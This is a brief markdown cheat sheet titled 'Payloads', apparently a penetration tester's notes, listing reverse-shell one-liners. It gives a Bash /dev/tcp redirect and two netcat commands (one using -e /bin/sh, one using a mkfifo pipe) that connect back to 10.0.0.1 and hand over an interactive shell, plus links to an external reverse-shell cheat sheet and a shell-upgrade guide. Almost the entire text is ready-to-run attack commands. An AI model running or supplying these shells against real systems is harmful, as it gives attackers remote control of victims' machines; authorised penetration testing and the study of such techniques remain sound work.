# Payloads

## Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

## Netcat
```bash
# if -e option is supported
nc -e /bin/sh 10.0.0.1 1234
# if -e is not supported
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

[Cheatsheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

[Upgrade Shell](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)
